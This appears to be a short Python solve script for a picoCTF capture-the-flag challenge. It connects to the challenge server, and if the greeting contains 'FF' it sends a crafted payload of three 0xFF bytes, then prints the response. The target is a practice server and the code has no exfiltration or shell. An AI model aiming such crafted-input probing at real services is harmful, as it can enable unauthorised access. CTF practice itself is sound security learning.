import socket

def solve():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)  # tránh treo vô hạn
    s.connect(('lonely-island.picoctf.net', 64044))

    try:
        data = s.recv(1024)
        if not data:
            print("Server closed connection.")
            return
        print('Received1:', data.decode(errors="ignore"))

        if b'FF' in data:
            s.sendall(b"\xff\xff\xff"  + b"\n")
            data = s.recv(1024)
            if not data:
                print("No response after sending payload.")
            else:
                print('Received2:', data.decode(errors="ignore"))
    except socket.timeout:
        print("Timed out waiting for server response.")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
